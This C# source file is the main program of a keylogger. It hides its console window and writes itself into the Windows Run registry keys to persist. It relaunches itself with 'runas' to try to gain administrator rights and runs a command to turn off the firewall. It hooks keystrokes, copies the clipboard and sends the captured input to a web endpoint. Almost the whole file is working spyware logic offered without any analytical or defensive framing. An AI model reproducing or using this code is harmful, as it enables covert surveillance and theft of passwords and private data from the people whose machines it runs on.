using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using KeyLogger.Commands;

namespace KeyLogger
{
    class Program
    {
        private const int SW_HIDE = 0;
        private const string CONNECT = "https://localhost:44388/kl/c";
        private const string SEND = "https://localhost:44388/kl/l";
        private const string REG_STARTUP_KEY_ADMIN = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        private const string REG_STARTUP_KEY_USER = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        private const string REG_NAME = "PVBPS-KL2";
        private const bool RUN_CHECKS_ON_USER = true;
        private static IList<ICommand> COMMANDS = new List<ICommand>()
        {
            new TurnOffFirewall()
        };

        [STAThread]
        public static void Main()
        {
            #region Terminal visibility

#if RELEASE
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);  // to hide the running application
#endif

            #endregion

            Logger.RunFile = Application.ExecutablePath.Replace(".dll", ".exe");

            try
            {
                #region Permissions

                // Get current executor permissions
                bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
#if DEBUG
                Console.WriteLine(runFile);
                Console.WriteLine(isAdmin ? "Administrator" : "User");
#endif

                #endregion

                #region Registers & Commands

                if (isAdmin)
                {
                    // Set global registry key
                    if (RegistryManager.ReadKey<string>(REG_STARTUP_KEY_ADMIN, REG_NAME) != Logger.RunFile)
                        RegistryManager.WriteKey(REG_STARTUP_KEY_ADMIN, REG_NAME, Logger.RunFile);

                    // Remove duplicit startup
                    RegistryManager.RemoveKey(REG_STARTUP_KEY_USER, REG_NAME);

                    // Execute admin commands
                    RunCommands(true);
                }
                else
                {
                    if (!RegistryManager.HasKey(REG_STARTUP_KEY_ADMIN, REG_NAME))
                    {
                        // Set user registry key
                        if(RegistryManager.ReadKey<string>(REG_STARTUP_KEY_USER, REG_NAME) != Logger.RunFile)
                            RegistryManager.WriteKey(REG_STARTUP_KEY_USER, REG_NAME, Logger.RunFile);

                        // Try get privileges
                        ElevatePrivileges();
                    }

                    // User could have reversed some of our changes, check their state
                    if(RUN_CHECKS_ON_USER)
                        RunChecks();

                    // Execute user commands
                    RunCommands(false);
                }

                #endregion

                #region Key logging

                using var keyboard = new KeyboardHook();
                var analyzer = new KeyboardAnalyzer();
                using var server = new WebHook();
                server.Connect(CONNECT).GetAwaiter().GetResult();

                analyzer.OnPress += (codes, keys) =>
                {
                    analyzer.CopyClipboard(keys);
#if DEBUG
                    Console.WriteLine($"{keys.Last().From.ToLongTimeString()} {keys.Last().To.ToLongTimeString()}: {string.Join(" + ", keys.Select(k => $"{k.Key} ({DateTime.UtcNow-k.From})"))}");
                    if (keys.Last().DataType.HasValue && keys.Last().Data != null)
                    {
                        var text = keys.Last().Data.ToString();
                        if (text != null)
                        {
                            if (text.Length > 80)
                                Console.WriteLine(text.Substring(0, 80));
                            else
                                Console.WriteLine(text);
                        }
                    }
#endif
                    server.SendKeys(SEND, keys);
                };

                keyboard.KeyDown += (i, k) => { analyzer.KeyDown(i, k); };
                keyboard.KeyUp += (i, k) => { analyzer.KeyUp(i, k); };

                #endregion

                Application.Run();
            }
            catch (Exception ex)
            {
                #region Fail log

                Logger.LogException(ex);
                
                #endregion
            }

#if DEBUG
            while(Console.ReadLine() != "exit");
#endif
        }

        /// <summary>
        /// Check if should run as admin
        /// </summary>
        private static void RunChecks()
        {
            foreach (var command in COMMANDS)
            {
                if (command.ChecksFailed())
                {
                    ElevatePrivileges();
                    return;
                }
            }
        }

        /// <summary>
        /// Try run self as admin
        /// </summary>
        private static void ElevatePrivileges()
        {
            Process proc = new Process();
            proc.StartInfo.FileName = Logger.RunFile;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            try
            {
                proc.Start();
            }
            catch (Exception ex)
            {
                Logger.LogException(ex);
            }
        }

        /// <summary>
        /// Execute commands using terminal
        /// </summary>
        private static void RunCommands(bool isAdmin)
        {
            foreach (var command in COMMANDS)
            {
                if(isAdmin)
                    command.RunAsAdmin(Logger.RunFile);
                else
                    command.RunAsUser(Logger.RunFile);
            }
        }

#if RELEASE
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
#endif
    }
}
